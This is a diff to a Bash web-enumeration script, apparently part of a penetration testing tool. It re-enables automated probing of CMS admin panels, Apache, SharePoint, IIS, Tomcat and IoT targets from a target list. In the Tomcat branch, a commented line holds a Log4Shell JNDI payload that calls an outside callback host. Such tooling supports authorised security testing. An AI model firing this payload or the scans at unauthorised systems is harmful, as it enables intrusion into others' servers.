@@ -2069,7 +2069,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then 
 						checkRAM
-						#enumeracionAdminCMS "$proto_http" "$host" "$port" "$msg_error_404"
+						enumeracionAdminCMS "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 
@@ -2085,7 +2085,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
 						checkRAM
-						#enumeracionApache "$proto_http" "$host" "$port" "$msg_error_404"
+						enumeracionApache "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 
@@ -2106,7 +2106,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es nginx y no se enumero antes
 						checkRAM
-						#enumeracionApi "$proto_http" "$host" "$port" "$msg_error_404"
+						enumeracionApi "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					
 
@@ -2115,7 +2115,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint
 						checkRAM
-						#enumeracionSharePoint "$proto_http" "$host" "$port" "$msg_error_404"
+						enumeracionSharePoint "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 
@@ -2124,7 +2124,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes
 						checkRAM
-						#enumeracionIIS "$proto_http" "$host" "$port" "$msg_error_404"
+						enumeracionIIS "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 					grep -i jboss logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"  # no redirecciona
@@ -2149,7 +2149,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
 						checkRAM
-						#enumeracionTomcat "$proto_http" "$host" "$port" "$msg_error_404"
+						enumeracionTomcat "$proto_http" "$host" "$port" "$msg_error_404"
 						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
 					fi
 					####################################
@@ -2209,11 +2209,11 @@ for line in $(cat $TARGETS); do
 					echo -e "\t\t[+] serverType $serverType"
 					if [[ -z "$serverType"  ]]; then
 						checkRAM
-						#enumeracionDefecto "$proto_http" "$host" $port "$msg_error_404"
+						enumeracionDefecto "$proto_http" "$host" $port "$msg_error_404"
 					fi
 
 					#######  if the server is IoT ######
-					#enumeracionIOT	$proto_http $host $port
+					enumeracionIOT	$proto_http $host $port
 
 					#echo -e "\t\t[+] cloneSite ($proto_http $host $port) PROXYCHAINS $PROXYCHAINS MODE $MODE"
 					######### clone #####
